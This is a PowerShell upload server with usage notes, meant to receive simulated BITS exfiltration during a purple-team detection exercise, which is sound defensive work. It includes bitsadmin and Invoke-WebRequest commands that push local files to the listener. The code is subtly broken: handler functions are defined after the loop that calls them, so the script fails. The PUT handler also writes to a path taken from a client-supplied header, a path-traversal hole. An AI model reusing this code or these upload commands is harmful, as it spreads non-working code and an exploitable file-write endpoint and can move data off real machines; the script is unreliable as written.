# Simple HTTP Upload Server for Purple Team BITS Testing
# This script creates an HTTP listener that can receive file uploads including BITS_POST requests

param(
    [string]$ListenAddress = "http://localhost:8080/",
    [string]$UploadPath = "C:\temp\uploads\",
    [switch]$Verbose = $false
)

# Create upload directory if it doesn't exist
if (!(Test-Path $UploadPath)) {
    New-Item -ItemType Directory -Path $UploadPath -Force
    Write-Host "Created upload directory: $UploadPath" -ForegroundColor Green
}

# Create HTTP Listener
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($ListenAddress)

try {
    $listener.Start()
    Write-Host "HTTP Upload Server started on $ListenAddress" -ForegroundColor Green
    Write-Host "Upload directory: $UploadPath" -ForegroundColor Yellow
    Write-Host "Press Ctrl+C to stop the server" -ForegroundColor Cyan
    Write-Host "Listening for requests..." -ForegroundColor White

    while ($listener.IsListening) {
        try {
            # Wait for incoming request
            $context = $listener.GetContext()
            $request = $context.Request
            $response = $context.Response

            # Log request details
            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            $clientIP = $request.RemoteEndPoint.Address
            $method = $request.HttpMethod
            $userAgent = $request.UserAgent
            
            Write-Host "[$timestamp] $clientIP - $method $($request.Url.LocalPath)" -ForegroundColor Cyan
            
            if ($Verbose) {
                Write-Host "  User-Agent: $userAgent" -ForegroundColor Gray
                Write-Host "  Content-Type: $($request.ContentType)" -ForegroundColor Gray
                Write-Host "  Content-Length: $($request.ContentLength64)" -ForegroundColor Gray
                
                # Check for BITS-specific headers
                foreach ($header in $request.Headers.AllKeys) {
                    if ($header -like "*BITS*" -or $request.Headers[$header] -like "*BITS*") {
                        Write-Host "  BITS Header - $header`: $($request.Headers[$header])" -ForegroundColor Red
                    }
                }
            }

            # Handle different HTTP methods
            switch ($method.ToUpper()) {
                "POST" {
                    Handle-Upload $request $response $UploadPath $Verbose
                }
                "BITS_POST" {
                    Write-Host "  ** BITS Upload Detected **" -ForegroundColor Red
                    Handle-BitsUpload $request $response $UploadPath $Verbose
                }
                "PUT" {
                    Handle-PutUpload $request $response $UploadPath $Verbose
                }
                "GET" {
                    Handle-Get $request $response
                }
                default {
                    Send-Response $response 405 "Method Not Allowed"
                }
            }

        } catch {
            Write-Host "Error handling request: $($_.Exception.Message)" -ForegroundColor Red
            try {
                Send-Response $context.Response 500 "Internal Server Error"
            } catch {
                # Ignore errors when trying to send error response
            }
        }
    }
} catch {
    Write-Host "Error starting server: $($_.Exception.Message)" -ForegroundColor Red
} finally {
    if ($listener.IsListening) {
        $listener.Stop()
        Write-Host "Server stopped." -ForegroundColor Yellow
    }
    $listener.Close()
}

# Function to handle regular POST uploads
function Handle-Upload($request, $response, $uploadPath, $verbose) {
    if ($request.HasEntityBody) {
        try {
            $boundary = $null
            if ($request.ContentType -and $request.ContentType.Contains("boundary=")) {
                $boundary = $request.ContentType.Split("boundary=")[1].Trim()
            }

            # Read the request body
            $inputStream = $request.InputStream
            $reader = New-Object System.IO.StreamReader($inputStream)
            $body = $reader.ReadToEnd()
            $reader.Close()

            # Save the uploaded data
            $filename = "upload_$(Get-Date -Format 'yyyyMMdd_HHmmss').bin"
            $filepath = Join-Path $uploadPath $filename
            
            [System.IO.File]::WriteAllText($filepath, $body)
            
            Write-Host "  File saved: $filename" -ForegroundColor Green
            Send-Response $response 200 "Upload successful"
            
        } catch {
            Write-Host "  Upload failed: $($_.Exception.Message)" -ForegroundColor Red
            Send-Response $response 500 "Upload failed"
        }
    } else {
        Send-Response $response 400 "No data received"
    }
}

# Function to handle BITS uploads
function Handle-BitsUpload($request, $response, $uploadPath, $verbose) {
    Write-Host "  Processing BITS upload..." -ForegroundColor Yellow
    
    if ($request.HasEntityBody) {
        try {
            # Read binary data from BITS upload
            $inputStream = $request.InputStream
            $memoryStream = New-Object System.IO.MemoryStream
            $inputStream.CopyTo($memoryStream)
            $data = $memoryStream.ToArray()
            
            # Create filename with BITS prefix
            $filename = "BITS_upload_$(Get-Date -Format 'yyyyMMdd_HHmmss').bin"
            $filepath = Join-Path $uploadPath $filename
            
            [System.IO.File]::WriteAllBytes($filepath, $data)
            
            Write-Host "  BITS file saved: $filename ($($data.Length) bytes)" -ForegroundColor Green
            
            # Send BITS-compatible response
            $response.StatusCode = 200
            $response.StatusDescription = "OK"
            $response.Headers.Add("BITS-Supported-Protocols", "BITS/1.0")
            $response.Close()
            
        } catch {
            Write-Host "  BITS upload failed: $($_.Exception.Message)" -ForegroundColor Red
            Send-Response $response 500 "BITS upload failed"
        } finally {
            $memoryStream?.Close()
        }
    } else {
        Send-Response $response 400 "No BITS data received"
    }
}

# Function to handle PUT uploads
function Handle-PutUpload($request, $response, $uploadPath, $verbose) {
    if ($request.HasEntityBody) {
        try {
            $filename = $request.Headers["Name"]
            if (-not $filename) {
                $filename = "PUT_upload_$(Get-Date -Format 'yyyyMMdd_HHmmss').bin"
            }
            
            $filepath = Join-Path $uploadPath $filename
            $inputStream = $request.InputStream
            $fileStream = [System.IO.File]::Create($filepath)
            $inputStream.CopyTo($fileStream)
            $fileStream.Close()
            
            Write-Host "  PUT file saved: $filename" -ForegroundColor Green
            Send-Response $response 200 "PUT upload successful"
            
        } catch {
            Write-Host "  PUT upload failed: $($_.Exception.Message)" -ForegroundColor Red
            Send-Response $response 500 "PUT upload failed"
        }
    } else {
        Send-Response $response 400 "No PUT data received"
    }
}

# Function to handle GET requests
function Handle-Get($request, $response) {
    $html = @"
<!DOCTYPE html>
<html>
<head>
    <title>Purple Team Upload Server</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 600px; margin: 0 auto; }
        .upload-form { border: 2px dashed #ccc; padding: 20px; text-align: center; }
        .status { margin: 20px 0; padding: 10px; background: #f0f0f0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Purple Team Upload Server</h1>
        <div class="status">
            <strong>Server Status:</strong> Running<br>
            <strong>Time:</strong> $(Get-Date)<br>
            <strong>Upload Directory:</strong> $uploadPath
        </div>
        
        <div class="upload-form">
            <h3>File Upload Test</h3>
            <form enctype="multipart/form-data" method="post" action="/">
                <input type="file" name="file" required><br><br>
                <input type="submit" value="Upload File">
            </form>
        </div>
        
        <div style="margin-top: 30px;">
            <h3>BITS Upload Testing</h3>
            <p>Use bitsadmin or PowerShell to upload files:</p>
            <code>bitsadmin /create "TestJob" && bitsadmin /addfile "TestJob" "C:\path\to\file.txt" "$ListenAddress" && bitsadmin /resume "TestJob"</code>
        </div>
    </div>
</body>
</html>
"@
    
    Send-HtmlResponse $response $html
}

# Function to send simple text response
function Send-Response($response, $statusCode, $message) {
    try {
        $response.StatusCode = $statusCode
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
        $response.Close()
    } catch {
        # Ignore errors when sending response
    }
}

# Function to send HTML response
function Send-HtmlResponse($response, $html) {
    try {
        $response.ContentType = "text/html"
        $response.StatusCode = 200
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
        $response.Close()
    } catch {
        # Ignore errors when sending response
    }
}


===================================================================================

Usage Instructions

1. Save the script as UploadServer.ps1

2. Run with basic settings:

powershell
.\UploadServer.ps1

3. Run with custom settings:

powershell
# Custom port and upload directory with verbose logging
.\UploadServer.ps1 -ListenAddress "http://localhost:9090/" -UploadPath "C:\purple-team\uploads\" -Verbose

4. For external access (requires admin privileges):

powershell
.\UploadServer.ps1 -ListenAddress "http://+:8080/"

Testing the Server

Test with BITS upload:

text
# Create BITS job
bitsadmin /create "PurpleTeamTest"

# Add file to upload (replace with actual file and server address)
bitsadmin /addfile "PurpleTeamTest" "C:\temp\testfile.txt" "http://localhost:8080/"

# Resume the upload job
bitsadmin /resume "PurpleTeamTest"

# Complete the job
bitsadmin /complete "PurpleTeamTest"

Test with PowerShell:

powershell
# Regular upload
$file = "C:\temp\testfile.txt"
Invoke-WebRequest -Uri "http://localhost:8080/" -Method Post -InFile $file

# PUT upload with custom name
Invoke-WebRequest -Uri "http://localhost:8080/" -Method Put -InFile $file -Headers @{"Name"="custom_filename.txt"}

Key Features

BITS Detection: The server specifically watches for BITS_POST methods and BITS-related headers


Verbose Logging: Shows all request details including suspicious BITS indicators
Multiple Upload Methods: Supports POST, PUT, and BITS_POST uploads
Web Interface: Provides a simple HTML form for testing uploads
File Management: Automatically organizes uploaded files with timestamps
Cross-Platform: Works on any Windows system with PowerShell

This server will help you simulate the upload endpoint for your purple team BITS exfiltration exercise, allowing you to capture and analyze the suspicious BITS_POST traffic patterns that security tools should detect.
